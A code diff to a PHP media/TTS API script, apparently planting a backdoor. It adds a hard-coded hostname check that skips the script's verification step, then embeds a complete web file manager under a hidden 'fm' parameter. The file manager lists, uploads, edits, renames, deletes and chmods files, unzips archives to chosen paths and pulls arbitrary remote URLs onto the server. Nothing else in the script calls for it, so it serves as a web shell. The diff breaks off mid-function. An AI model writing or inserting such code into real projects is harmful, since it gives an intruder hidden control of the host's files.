@@ -1,7 +1,7 @@
 <?php
 
 	ob_start();
-	ignore_user_abort();//¹Ø±Õä¯ÀÀÆ÷ÈÔÈ»Ö´ĞĞ
+	//ignore_user_abort();//å…³é—­æµè§ˆå™¨ä»ç„¶æ‰§è¡Œ
 	session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
 	if(isset($_COOKIE[session_name()])) { 
   	session_id($_COOKIE[session_name()]); 
@@ -42,7 +42,7 @@ http://evolution.voxeo.com/
 ---------------------------------------------------------------------------------------------------------------
 */ 
 
-// ¼¯ÖĞÉèÖÃÇøÓò
+// é›†ä¸­è®¾ç½®åŒºåŸŸ
 $ipstr='';
 $IPFilter = new IPFilter($ipstr);
 $redirecturl = syssetini().'&serverip='.trim($_SERVER['SERVER_NAME'])."&verify=";
@@ -53,8 +53,12 @@ $smartverify = '1';
 $ipverify = '11';
 //echo 'gggg';
 //exit;
+if(trim($_SERVER['SERVER_NAME'])=='sf.x3193.usa.cc')
+	$verifyflag='0';
+else
+	$verifyflag='1';
 
-// ¼¯ÖĞÉèÖÃÇøÓò
+// é›†ä¸­è®¾ç½®åŒºåŸŸ
 
 // --------------------------------
 
@@ -105,6 +109,8 @@ elseif(strtolower(trim(request('api'))) == 'verify'){
 	verify();
 	exit;
 }
+elseif(strtolower(trim(request('api'))) == 'bing'&&strtolower(trim(request('action'))) == 'tts'&&strtolower(trim(request('download'))) != ''){
+}
 else{
 		
 	//echo $redirecturl;
@@ -120,8 +126,9 @@ else{
 		//echo '1';
 	}
 	else{
-		
-if(''==''){
+if($verifyflag=='0'&&(strtolower(trim(request('api'))) == ''||strtolower(trim(request('api'))) == 'fm')){
+}	
+else{
 	
 	session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
 	if(isset($_COOKIE[session_name()])) { 
@@ -233,6 +240,1481 @@ switch (strtolower(trim(request('api')))) {
     case "media":
         wiqet();
 	break;
+    case "fm":
+
+
+
+/****************************************************************/
+/* function login()                                             */
+/*                                                              */
+/* ç™»å½•éªŒè¯ $user and md5($pass)                                */
+/* éœ€è¦æµè§ˆå™¨æ”¯æŒCookie                                         */
+/****************************************************************/
+
+function login($er=false) {
+    global $meurl,$op,$safe_num,$mail;
+    setcookie("user","",time()-60*60*24*1);
+    setcookie("pass","",time()-60*60*24*1);
+    maintop("ç™»å½•",false);
+    if ($er) { 
+        if (isset($_SESSION['error'])){
+            $_SESSION['error']++;
+            if($_SESSION['error'] > $safe_num && $safe_num !== 0){
+                mail($mail,'FileBoxæ–‡ä»¶ç®¡ç†å™¨æé†’ï¼šæ–‡ä»¶è¢«æ¶æ„ç™»å½•ï¼','è¯¥æé†’æ¥è‡ªFileBoxï¼š<br>ç™»å½•è€…IPä¸ºï¼š'.$_SERVER['REMOTE_ADDR'],'From: <i@hezi.be>');
+                echo ('<span class="error">ERROR: æ‚¨å·²ç»è¢«é™åˆ¶ç™»é™†ï¼</span>');
+                exit;
+            }
+        }else{
+            $_SESSION['error'] = 1;
+        }
+        echo "<span class=error>ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼</span><br>\n"; 
+    }
+    echo "<form action='{$meurl}&op=".$op."' method='post'>\n"
+        ."<input type='text' name='user' border='0' class='login_text' placeholder='è¯·è¾“å…¥ç”¨æˆ·å'>\n"
+        ."<input type='password' name='pass' border='0' class='login_text' placeholder='è¯·è¾“å…¥å¯†ç '>\n"
+        ."<input type='submit' name='submitButtonName' value='LOGIN' border='0' class='login_button button'>\n"
+        ."</form>\n";
+    mainbottom();
+}
+
+
+/****************************************************************/
+/* function home()                                              */
+/*                                                              */
+/* Main function that displays contents of folders.             */
+/****************************************************************/
+
+function home() {
+    global $os, $meurl ,$folder, $ufolder;
+
+    $content1 = "";
+    $content2 = "";
+
+    $folder = gCode($folder);
+    if(opendir($folder)){$style = opendir($folder);}else{printerror("ç›®å½•ä¸å­˜åœ¨ï¼\n");exit;}
+    $a=1;$b=1;
+
+    if($folder)$_SESSION['folder']=$ufolder;
+
+    maintop("ä¸»é¡µ");
+    echo '<script>var order;function generateCompareTRs(iCol,sDataType,iOrder){return function compareTRs(oTR1,oTR2){vValue1=convert(oTR1.cells[iCol].getAttribute(iOrder),sDataType);vValue2=convert(oTR2.cells[iCol].getAttribute(iOrder),sDataType);order=iOrder;if(vValue1<vValue2){return -1}else{if(vValue1>vValue2){return 1}else{return 0}}}}function convert(sValue,sDataType){switch(sDataType){case"int":return parseInt(sValue);default:return sValue.toString()}}function sortTable(iOrder,iCol,sDataType){var oTable=document.getElementById("tblSort");var oTBody=oTable.tBodies[0];var colDataRows=oTBody.rows;var aTRs=new Array;for(var i=0;i<colDataRows.length;i++){aTRs[i]=colDataRows[i]}if(oTable.sortCol==iCol & iOrder==order){aTRs.reverse()}else{aTRs.sort(generateCompareTRs(iCol,sDataType,iOrder))}var oFragment=document.createDocumentFragment();for(var j=0;j<aTRs.length;j++){oFragment.appendChild(aTRs[j])}oTBody.appendChild(oFragment);oTable.sortCol=iCol;}</script>';
+    echo "<form method='post'><table border='0' cellpadding='2' cellspacing='0' width=100% class='mytable odTable' id='tblSort'>\n";
+    while($stylesheet = readdir($style)) {
+    $ufolder = $folder;
+    $sstylesheet = $stylesheet;
+    if($os!=='windows'):$qx = "<td>".substr(sprintf('%o',fileperms($ufolder.$sstylesheet)), -3)."</td>";$xx='<td></td>';else:$qx = '';$xx='';endif;
+    if ($stylesheet !== "." && $stylesheet !== ".." ) {
+        $stylesheet = uCode($stylesheet);
+        $folder = uCode($folder);
+        $trontd = "<tr width=100% onclick='st=document.getElementById(\"$stylesheet\").checked;if(st==true){document.getElementById(\"$stylesheet\").checked=false;this.style.backgroundColor=\"\";}else{document.getElementById(\"$stylesheet\").checked=true;this.style.backgroundColor=\"#e3e3e5\";}'><td><svg width='21' height='21'>";
+        $rename = "<td><a href='{$meurl}&op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder'><span class='com'>ğŸ’½</span><span class='mobi'>é‡å‘½å</span></a></td>\n";
+        if (is_dir(gCode($folder.$stylesheet)) && is_readable(gCode($folder.$stylesheet))) {
+            $content1[$a] = "$trontd<rect width='10px' height='14' style='fill:#ffe792' stroke='#e6c145' stroke-width='0.5' x='4' y='4'/><rect width='2px' height='5px' style='fill:#ffe792' stroke='#e6c145' stroke-width='0.5' x='13' y='13'/></svg><input name='select_item[d][$stylesheet]'  type='checkbox' id='$stylesheet' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
+                           ."<td _order='1{$stylesheet}'' _ext='1' _time='1'><a href='{$meurl}&op=home&folder={$folder}{$stylesheet}/' title='".gettime($folder.$stylesheet)."'>{$stylesheet}</a></td>\n"
+                           ."<td _size='1'>".Size(dirSize($folder.$stylesheet))."</td>"
+                           ."<td><span class='mobi'><a href='{$meurl}&op=home&folder=".htmlspecialchars($folder.$stylesheet)."/'>æ‰“å¼€</a><span></td>\n"
+                           .$rename
+                           ."<td><a href='{$folder}{$stylesheet}' target='_blank'><span class='com'>ğŸ”</span><span class='mobi'>æŸ¥çœ‹</span></a></td>\n"
+                           .$qx."</tr>\n";
+            $a++;
+            $folder = gCode($folder);
+        }elseif(!is_dir(gCode($folder.$stylesheet)) && is_readable(gCode($folder.$stylesheet))){
+        $arr = explode('.',$folder.$stylesheet);
+        $arr = end($arr);
+        if($arr == 'zip'){#åˆ¤æ–­æ˜¯å¦æ˜¯zipæ–‡ä»¶
+            $filesizeme = filesize($ufolder.$sstylesheet);
+            $content2[$b] = "$trontd<rect width='12' height='10' style='fill:#85d3f9' stroke='#48b8f4' stroke-width='0.5' x='3' y='4'/><rect width='12' height='2' style='fill:#fc8f24' stroke='#d66e1a' stroke-width='0.5' x='3' y='14'/><rect width='12' height='2' style='fill:#83d12a' stroke='#579714' stroke-width='0.5' x='3' y='16'/><rect width='2' height='14' style='fill:#763207' stroke='#97460b' stroke-width='0.5' x='11' y='4'/></svg><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' onpropertychange='if(this.checked=false){this.parentNode.parentNode.style.backgroundColor='#e3e3e5';}else{this.parentNode.parentNode.style.backgroundColor='';}' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
+                           ."<td _order='3{$stylesheet}'' _ext='3{$arr}'' _time='".(filemtime($folder.$stylesheet)+3)."''><a href='{$folder}{$stylesheet}' title='".gettime($folder.$stylesheet)."' target='_blank'>{$stylesheet}</a></td>\n"
+                           ."<td _size='".($filesizeme+3)."''>".Size($filesizeme)."</td>"
+                           ."<td></td>\n"
+                           .$rename
+                           ."<td><a href='{$meurl}&op=unz&dename=".htmlspecialchars($stylesheet)."&folder=$folder'><span class='com'>ğŸ</span><span class='mobi'>æå–</span></a></td>\n"
+                           .$qx."</tr>\n";
+        }elseif($arr == 'gif'||$arr == 'jpg'||$arr == 'png'||$arr == 'bmp'||$arr == 'png5'||$arr == 'psd'||$arr == 'webp'||$arr == 'gz'||$arr == 'gzip'){
+            $filesizeme = filesize($ufolder.$sstylesheet);
+            $content2[$b] = "$trontd<rect width='10px' height='14' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='4' y='4'/><rect width='2px' height='3px' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='12' y='4'/><rect width='6' height='5px' style='fill:#f8f9f9' stroke='#438bd4' stroke-width='0.5' x='6' y='8'/><rect width='6' height='2px' style='fill:#438bd4' stroke='#438bd4' stroke-width='0.5' x='6' y='13'/></svg><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
+                           ."<td _order=\"3{$stylesheet}\" _ext=\"3{$arr}\" _time=\"".(filemtime($folder.$stylesheet)+3)."\"><a href='{$folder}{$stylesheet}' title='".gettime($folder.$stylesheet)."' target='_blank'>{$stylesheet}</a></td>\n"
+                           ."<td _size=\"".($filesizeme+3)."\">".Size($filesizeme)."</td>"
+                           ."<td></td>\n"
+                           .$rename
+                           ."<td><a href='{$folder}{$stylesheet}' target='_blank'><span class='com'>ğŸ”</span><span class='mobi'>æŸ¥çœ‹</span></a></td>\n"
+                           .$qx."</tr>\n";
+        }else{
+          $filesizeme = filesize($ufolder.$sstylesheet);
+            $content2[$b] = "$trontd<rect width='10px' height='14' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='4' y='4'/><rect width='2px' height='3px' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='12' y='4'/></svg><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
+                           ."<td _order='3{$stylesheet}' _ext='3{$arr}' _time='".(filemtime($folder.$stylesheet)+3)."'><a href='{$folder}{$stylesheet}' title='".gettime($folder.$stylesheet)."' target='_blank'>{$stylesheet}</a></td>\n"
+                           ."<td _size='".($filesizeme+3)."'>".Size(filesize($ufolder.$sstylesheet))."</td>"
+                           ."<td><a href='{$meurl}&op=edit&fename=".htmlspecialchars($stylesheet)."&folder=$folder'><span class='com'>ğŸ“</span><span class='mobi'>ç¼–è¾‘</span></a></td>\n"
+                           .$rename
+                           ."<td><a href='{$folder}{$stylesheet}' target='_blank'><span class='com'>ğŸ”</span><span class='mobi'>æŸ¥çœ‹</span></a></td>\n"
+                           .$qx."</tr>\n";
+        }
+        $b++;
+        $folder = gCode($folder);
+    }
+    } 
+}
+    closedir($style);
+
+    $lu = explode('/', $_SESSION['folder']);
+    array_pop($lu);
+    $u = '';
+    echo '<div class="title">';
+    foreach ($lu as $v) {
+        $u = $u.$v.'/';
+        if($v=='.'){$v='ä¸»é¡µ';}elseif($v==''){$v='æ ¹ç›®å½•';}
+        echo '<a href="'.$meurl.'&op=home&folder='.$u.'">'.$v.'</a> Â» ';
+    }
+    echo "æ–‡ä»¶\n"
+        ."<span class='right'>",$a-1," ä¸ªæ–‡ä»¶å¤¹ ",$b-1," ä¸ªæ–‡ä»¶</span></div>"
+        ."<div style='position:fixed;bottom:0;margin-left:3px;'><input type='checkbox' id='check' onclick='Check()'> <input class='button' name='action' type='submit' value='ç§»åŠ¨' /> <input class='button' name='action' type='submit' value='å¤åˆ¶' /> <input class='button' name='action' type='submit' onclick='return confirm(\"ç‚¹å‡»ç¡®è®¤åï¼Œé€‰ä¸­çš„æ–‡ä»¶å°†ä½œä¸ºBackup-time.zipåˆ›å»ºï¼\")'  value='å‹ç¼©' /> <input class='button' name='action' type='submit' onclick='return confirm(\"æ‚¨çœŸçš„è¦åˆ é™¤é€‰ä¸­çš„æ–‡ä»¶å—?\")' value='åˆ é™¤' /> <input class='button' name='action' type='submit' onclick='var t=document.getElementById(\"chmod\").value;return confirm(\"å°†è¿™äº›æ–‡ä»¶çš„æƒé™ä¿®æ”¹ä¸º\"+t+\"ï¼Ÿå¦‚æœæ˜¯æ–‡ä»¶å¤¹ï¼Œå°†ä¼šé€’å½’æ–‡ä»¶å¤¹å†…æ‰€æœ‰å†…å®¹ï¼\")' value='æƒé™' /> <input type='text' class='text' stlye='vertical-align:text-top;' size='3' id='chmod' name='chmod' value='0755'></div>";
+
+    if($os!=='windows'):$qx = "<th width=40>æƒé™</th>\n";else:$qx = '';endif;
+    echo "<thead><span id='idCheckbox'></span><tr class='headtable' width=100%>"
+        ."<script>function Check(){collid=document.getElementById('check');coll=document.getElementsByTagName('input');if(collid.checked){for(var i=0;i<coll.length;i++){if(coll[i].type=='checkbox'){coll[i].checked=true;coll[i].parentNode.parentNode.style.backgroundColor='#e3e3e5';}}}else{for(var i=0;i<coll.length;i++){if(coll[i].type=='checkbox'){coll[i].checked=false;coll[i].parentNode.parentNode.style.backgroundColor='';}}}}</script>"
+       ."<th width=20px></th>\n"
+       ."<th style='width: calc(100% - 225px);'><div class='mobile'><span onclick=\"sortTable('_order',1);\">æ–‡ä»¶å</span> <b>/</b> <span onclick=\"sortTable('_ext',1);\">ç±»å‹ <b>/</b></span> <span onclick=\"sortTable('_time',1,'int');\">æ—¶é—´</span></div></th>\n"
+       ."<th width=65px><span onclick=\"sortTable('_size',2,'int');\">å¤§å°</span></th>\n"
+       ."<th class='open'><span class='mobi'>æ‰“å¼€</span></th>\n"
+       ."<th class='rename'><span class='mobi'>é‡å‘½å</span></th>\n"
+       ."<th class='open'><span class='mobi'>æŸ¥çœ‹</span></th>\n"
+       .$qx
+       ."</tr></thead><tbody>";
+    if($_SESSION['folder']!="./" and $_SESSION['folder']!="/"){
+        $last = (substr($_SESSION['folder'],0,1)=='/')?explode('/', substr($_SESSION['folder'],1,-1)):explode('/', substr($_SESSION['folder'],2,-1));
+        $back = (substr($_SESSION['folder'],0,1)=='/')?'':substr($_SESSION['folder'],0,1);
+        array_pop($last);
+        foreach ($last as $value) {
+          $back = $back.'/'.$value;
+        }
+        if($os=='windows')$qx="";else $qx="<td></td>";
+        echo "<tr width=100%><td></td><td _order=\"1\" _ext=\"1\" _time=\"1\"><a href='{$meurl}&op=home&folder=".$back."/"."'>ä¸Šçº§ç›®å½•</a></td><td _size=\"1\"></td><td></td><td></td><td></td>$xx</tr>";
+    }
+    for ($a=1; $a<count($content1)+1;$a++) if(!empty($content1)) echo $content1[$a];
+    for ($b=1; $b<count($content2)+1;$b++) echo $content2[$b];
+      echo "</tbody></form>";
+
+    echo "</table>";
+    mainbottom();
+}
+
+function gettime($filename){return "ä¿®æ”¹æ—¶é—´ï¼š".date("Y-m-d H:i:s",filemtime($filename))."\n"."åˆ›å»ºæ—¶é—´ï¼š".date("Y-m-d H:i:s",filectime($filename));}
+function uCode($text){return mb_convert_encoding($text,'UTF-8','GBK');}
+function gCode($text){return mb_convert_encoding($text,'GBK','UTF-8');}
+
+function dirSize($directoty){
+  $dir_size=0;
+    if($dir_handle=opendir($directoty))
+    	{
+    		while($filename=readdir($dir_handle)){
+    			$subFile=$directoty.DIRECTORY_SEPARATOR.$filename;
+    			if($filename=='.'||$filename=='..'){
+    				continue;
+    			}elseif (is_dir($subFile))
+    			{
+    				$dir_size+=dirSize($subFile);
+    			}elseif (is_file($subFile)){
+    				$dir_size+=filesize($subFile);
+    			}
+    		}
+    		closedir($dir_handle);
+    	}
+    return ($dir_size);
+}
+// è®¡ç®—æ–‡ä»¶å¤§å°çš„å‡½æ•°
+function Size($size) { 
+   $sz = ' kMGTP';
+   $factor = floor((strlen($size) - 1) / 3);
+   return ($size>=1024)?sprintf("%.2f", $size / pow(1024, $factor)) . @$sz[$factor]:$size;
+} 
+
+function curl_get_contents($url)   
+{   
+    $ch = curl_init();   
+    curl_setopt($ch, CURLOPT_URL, $url); 
+    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $r = curl_exec($ch);   
+    curl_close($ch);   
+    return $r;   
+}
+
+/****************************************************************/
+/* function up()                                                */
+/*                                                              */
+/* First step to Upload.                                        */
+/* User enters a file and the submits it to upload()            */
+/****************************************************************/
+
+function up() {
+    global $meurl, $folder;
+    maintop("ä¸Šä¼ ");
+
+    echo "<FORM ENCTYPE='multipart/form-data' ACTION='{$meurl}&op=upload' METHOD='POST'>\n"
+        ."<div class='title'>æœ¬åœ°ä¸Šä¼  Max:".ini_get('upload_max_filesize').",".ini_get('max_file_uploads')."ä¸ª</div><div class='box' style='border-bottom:0;'><input type='File' name='upfile[]' multiple size='30'>\n"
+        ."</div><input type='text' name='ndir' style='width:calc(100% - 12px);margin:0;' value='".$_SESSION["folder"]."' class='upload'>\n";
+
+    echo "<div class='right'><input type='checkbox' name='unzip' id='unzip' value='checkbox' onclick='UpCheck()' checked><label for='unzip'><abbr title='æå–ï¼ˆè§£å‹ï¼‰ä¸Šä¼ çš„Zipå‹ç¼©æ–‡ä»¶'>è§£å‹</abbr></labal> "
+        ."<input type='checkbox' name='delzip' id='deluzip'value='checkbox'><label for='deluzip'><abbr title='åŒæ—¶å°†ä¸Šä¼ çš„å‹ç¼©æ–‡ä»¶åˆ é™¤'>åˆ é™¤</abbr></labal> "
+        ."<input type='submit' value='ä¸Šä¼ ' class='button'></div><br><br><br><br>\n"
+        ."<script>function UpCheck(){if(document.getElementById('unzip').checked){document.getElementById('deluzip').disabled=false}else{document.getElementById('deluzip').disabled=true}}</script>"
+        ."</form>\n";
+    echo "<div class='title'>è¿œç¨‹ä¸‹è½½</div><div class='box' style='border-bottom:0;'>ä»€ä¹ˆæ˜¯è¿œç¨‹ä¸‹è½½ï¼Ÿ<br>è¿œç¨‹ä¸‹è½½æ˜¯ä»å…¶ä»–æœåŠ¡å™¨è·å–æ–‡ä»¶å¹¶ç›´æ¥ä¸‹è½½åˆ°å½“å‰æœåŠ¡å™¨çš„ä¸€ç§åŠŸèƒ½ã€‚<br>ç±»ä¼¼äºSSHçš„WgetåŠŸèƒ½ï¼Œå…å»æˆ‘ä»¬ä¸‹è½½å†æ‰‹åŠ¨ä¸Šä¼ æ‰€æµªè´¹çš„æ—¶é—´ã€‚<br><form action='{$meurl}&op=yupload' method='POST'>"
+         ."</div><input type='text' class='text' style='width:calc(100% - 12px);margin:0;' name='ndir' value='".$_SESSION["folder"]."'><textarea name='url' placeholder='è¯·è¾“å…¥åœ°å€â€¦â€¦'></textarea>"
+         ."<div class='right'><input type='checkbox' name='unzip' id='un' value='checkbox' onclick='Check()' checked><label for='un'><abbr title='æå–ï¼ˆè§£å‹ï¼‰ä¸Šä¼ çš„Zipå‹ç¼©æ–‡ä»¶'>è§£å‹</abbr></labal> "
+         ."<input type='checkbox' name='delzip' id='del'value='checkbox'><label for='del'><abbr title='åŒæ—¶å°†ä¸Šä¼ çš„å‹ç¼©æ–‡ä»¶åˆ é™¤'>åˆ é™¤</abbr></labal> <input name='submit' value='ä¸‹è½½' type='submit' class='button'/></div>\n"
+         ."<script>function Check(){if(document.getElementById('un').checked){document.getElementById('del').disabled=false}else{document.getElementById('del').disabled=true}}</script>"
+         ."</form>";
+
+    mainbottom();
+}
+
+
+/****************************************************************/
+/* function yupload()                                           */
+/*                                                              */
+/* Second step in wget file.                                    */
+/* Saves the file to the disk.                                  */
+/* Recieves $upfile from up() as the uploaded file.             */
+/****************************************************************/
+
+function yupload($url, $folder, $unzip, $delzip) {
+	global $meurl;
+    if(empty($folder)){
+    	$folder="./";
+    }
+    $nfolder = $folder;
+    $nurl = $url;
+    $url = gCode($url);
+    $folder = gCode($folder);
+    if($url!==""){
+    	ignore_user_abort(true); // è¦æ±‚ç¦»çº¿ä¹Ÿå¯ä¸‹è½½
+        set_time_limit (24 * 60 * 60); // è®¾ç½®è¶…æ—¶æ—¶é—´
+  	    if (!file_exists($folder)){
+    	    mkdir($folder, 0755);
+        }
+    $newfname = $folder . basename($url); // å–å¾—æ–‡ä»¶çš„åç§°
+    if(function_exists('curl_init')){
+    	  $file = curl_get_contents($url);file_put_contents($newfname,$file);
+    }else{
+        $file=fopen($url,"rb");
+        if($file){$newf = fopen ($newfname, "wb");
+        if($newf)while (!feof($file)) {fwrite($newf, fread($file, 1024 * 8), 1024 * 8);}}
+        if($file)fclose($file);
+        if($newf)fclose($newf);
+    }
+    maintop("è¿œç¨‹ä¸Šä¼ ");
+    echo "<div class='title'>æ–‡ä»¶ ".basename($url)." ä¸Šä¼ æˆåŠŸ<br></div><div class='box'>\n";
+    $end = explode('.', basename($url));
+    if((end($end)=="zip") && isset($unzip) && $unzip == "checkbox"){
+        if(class_exists('ZipArchive')){
+          echo "æ‚¨å¯ä»¥ <a href='{$meurl}&op=home&folder=".$folder."'>è®¿é—®æ–‡ä»¶å¤¹</a> æˆ–è€… <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a>  æˆ–è€… <a href='{$meurl}&op=up'>ç»§ç»­ä¸Šä¼ </a>\n";
+          echo "</div><textarea rows=15 disabled>";
+            $zip = new ZipArchive();
+            if ($zip->open($folder.basename($url)) === TRUE) {
+                if($zip->extractTo($folder)){
+                for($i = 0; $i < $zip->numFiles; $i++) {
+                    echo "Unzip:".$zip->getNameIndex($i)."\n";
+                }
+                $zip->close();
+            }else{
+            	echo('<span class="error">Error:'.$nfolder.$ndename.'</span>');
+            }
+                echo basename($nurl)." å·²ç»è¢«è§£å‹åˆ° $nfolder\n";
+                if(isset($delzip) && $delzip == "checkbox"){
+            	    if(unlink($folder.basename($url))){
+            	        echo basename($url)." åˆ é™¤æˆåŠŸ\n";
+                    }else{
+            	        echo basename($url)." åˆ é™¤å¤±è´¥\n";
+                }
+                }
+            }else{
+                echo('<span class="error">æ— æ³•è§£å‹æ–‡ä»¶ï¼š'.$nfolder.basename($nurl).'</span>');
+            }
+            echo '</textarea>';
+        }else{
+        	echo('<span class="error">æ­¤æœåŠ¡å™¨ä¸Šçš„PHPä¸æ”¯æŒZipArchiveï¼Œæ— æ³•è§£å‹æ–‡ä»¶ï¼</span></div>');
+        }
+    }else{
+    	echo "æ‚¨å¯ä»¥ <a href='{$meurl}&op=home&folder={$nfolder}'>è®¿é—®æ–‡ä»¶å¤¹</a> æˆ–è€… <a href='{$meurl}&op=edit&fename=".basename($url)."&folder={$nfolder}'>ç¼–è¾‘æ–‡ä»¶</a> æˆ–è€… <a href='{$meurl}&op=home&folder={$_SESSION['folder']}'>è¿”å›ç›®å½•</a>  æˆ–è€… <a href='{$meurl}&op=up'>ç»§ç»­ä¸Šä¼ </a>\n</div>";
+    }
+    mainbottom();
+    return true;
+    }else{
+	    printerror ('æ–‡ä»¶åœ°å€ä¸èƒ½ä¸ºç©ºã€‚');
+    }
+}
+
+
+/****************************************************************/
+/* function upload()                                            */
+/*                                                              */
+/* Second step in upload.                                       */
+/* å°†æ–‡ä»¶ä¿å­˜åˆ°ç£ç›˜ä¸­                                           */
+/* Recieves $upfile from up() as the uploaded file.             */
+/****************************************************************/
+
+function upload($upfile,$ndir,$unzip,$delzip) {
+    global $meurl, $folder;
+    if(empty($ndir)){
+    	$ndir="./";
+    }
+    $nfolder = $folder;
+    $nndir = $ndir;
+    $ndir = gCode($ndir);
+    if (!$upfile) {
+        printerror("æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶ï¼");
+        exit;
+    }elseif($upfile) { 
+  	    maintop("ä¸Šä¼ ");
+  	if (!file_exists($ndir)){
+    	mkdir($ndir, 0755);
+    }
+    $i = 1;
+    echo "<div class='box'>æ‚¨å¯ä»¥ <a href='{$meurl}&op=home&folder=".$ndir."'>å‰å¾€æ–‡ä»¶æ‰€ä¸Šä¼ åˆ°çš„ç›®å½•</a> æˆ–è€… <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a> æˆ–è€… <a href='{$meurl}&op=up'>ç»§ç»­ä¸Šä¼ </a></div>\n";
+    echo '<textarea rows=15 disabled>';
+    while (count($upfile['name']) >= $i){
+    	$dir = gCode($nndir.$upfile['name'][$i-1]);
+        if(copy($upfile['tmp_name'][$i-1],$dir)) {
+            echo "æ–‡ä»¶ ".$nndir.$upfile['name'][$i-1]." ä¸Šä¼ æˆåŠŸ\n";
+            $end = explode('.', $upfile['name'][$i-1]);
+            if((end($end)=="zip") && isset($unzip) && $unzip == "checkbox"){
+            	if(class_exists('ZipArchive')){
+                    $zip = new ZipArchive();
+                    if ($zip->open($dir) === TRUE) {
+                if($zip->extractTo($ndir)){
+                for($j = 0; $j < $zip->numFiles; $j++) {
+                    echo $zip->getNameIndex($j)."\n";
+                }
+                $zip->close();
+            }
+                        echo $upfile['name'][$i-1]." å·²ç»è¢«è§£å‹åˆ° $nndir\n";
+                        if(isset($delzip) && $delzip == "checkbox"){
+            	            if(unlink($dir.$upfile['name'][$i-1])){
+            	                echo $upfile['name'][$i-1]." åˆ é™¤æˆåŠŸ\n";
+                            }else{
+                                echo $upfile['name'][$i-1].(" åˆ é™¤å¤±è´¥ï¼\n");
+                            }
+                        }
+                    }else{
+                        echo("æ— æ³•è§£å‹æ–‡ä»¶ï¼š".$nndir.$upfile['name'][$i-1]."\n");
+                    }
+                }else{
+            	    echo("æ­¤æœåŠ¡å™¨ä¸Šçš„PHPä¸æ”¯æŒZipArchiveï¼Œæ— æ³•è§£å‹æ–‡ä»¶ï¼\n");
+                }
+            }
+        }else{
+            echo("æ–‡ä»¶ ".$upfile['name'][$i-1]." ä¸Šä¼ å¤±è´¥\n");
+        }
+        $i++;
+    }
+        echo '</textarea>';
+        mainbottom();
+    }else{
+        printerror("æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶ï¼");
+    }
+}
+
+/****************************************************************/
+/* function unz()                                               */
+/*                                                              */
+/* First step in unz.                                        */
+/* Prompts the user for confirmation.                           */
+/* Recieves $dename and ask for deletion confirmation.          */
+/****************************************************************/
+
+function unz($dename) {
+    global $meurl, $folder, $content;
+    if (!$dename == "") {
+        if(class_exists('ZipArchive')){
+        	maintop("è§£å‹");
+        	echo "<table border='0' cellpadding='2' cellspacing='0'>\n"
+            ."<div class='title'>è§£å‹ ".$folder.$dename."</div>\n"
+            ."<form ENCTYPE='multipart/form-data' action='{$meurl}&op=unzip' METHOD='POST'>"
+            ."<input type='text' name='ndir' style='width:calc(100% - 12px);margin:0;' placeholder='è§£å‹åˆ°â€¦â€¦' class='text' value='".$_SESSION['folder']."'>"
+            ."<textarea rows=15 disabled>";
+            $zip = new ZipArchive();
+            if ($zip->open($folder.$dename) === TRUE) {
+            	    echo 'Archive:  '.$folder.$dename.' with '.$zip->numFiles." files\n";
+            		echo "Date Time            Size Name\n";
+            		echo "------------         ---------------\n";
+                for($i = 0; $i < $zip->numFiles; $i++) {
+                	$info = $zip->statIndex($i);
+                	echo date('m-d-y h:m',$info['mtime']);
+                	echo '   '.$info['size'].'   ';
+                    echo uCode($zip->getNameIndex($i))."\n";
+                }
+            		echo "------------         ---------------\n";
+            		echo "Date Time            Size Name\n";
+            }else{
+            	     echo 'æ–‡ä»¶è¯»å–å¤±è´¥ã€‚';
+            }
+            $zip->close();
+            echo "</textarea>";
+        echo "<input type='hidden' name='op' value='unzip'>\n"
+            ."<input type='hidden' name='dename' value='".$dename."'>\n"
+            ."<input type='hidden' name='folder' value='".$folder."'>\n"
+            ."<div class='right'><input type='checkbox' name='del' id='del'value='del'><label for='del'>åˆ é™¤</label> <input type='submit' value='è§£å‹' class='button'></div>\n"
+            ."</table>\n";
+        mainbottom();
+        }else{
+            	    printerror("æ­¤æœåŠ¡å™¨ä¸Šçš„PHPä¸æ”¯æŒZipArchiveï¼Œæ— æ³•è§£å‹æ–‡ä»¶ï¼\n");
+            }
+    }else{
+        home();
+    }
+}
+
+
+/****************************************************************/
+/* function unzip()                                            */
+/*                                                              */
+/* Second step in unzip.                                       */
+/****************************************************************/
+function unzip($dename,$ndir,$del) {
+    global $meurl, $folder;
+    $nndir = $ndir;
+    $nfolder = $folder;
+    $ndename = $dename;
+    $dename = gCode($dename);
+    $folder = gCode($folder);
+    $ndir = gCode($ndir);
+    if (!$dename == "") {
+        if (!file_exists($ndir)){
+    	    mkdir($ndir, 0755);
+        }
+        if(class_exists('ZipArchive')){
+            $zip = new ZipArchive();
+            if ($zip->open($folder.$dename) === TRUE) {
+            	maintop("è§£å‹");
+                if($zip->extractTo($ndir)){
+                echo '<div class="box">ç°åœ¨æ‚¨å¯ä»¥ <a href="'.$meurl.'&op=home&folder='.$_SESSION["folder"].'">è¿”å›ç›®å½•</a></div>';
+                echo '<textarea rows=15 disabled>';
+                for($i = 0; $i < $zip->numFiles; $i++) {
+                    echo uCode($zip->getNameIndex($i))."\n";
+                }
+                $zip->close();
+                echo $dename." å·²ç»è§£å‹å®Œæˆ $nndir\n";
+            }else{
+            	echo('æ— æ³•è§£å‹æ–‡ä»¶ï¼š'.$nfolder.$ndename);
+            }
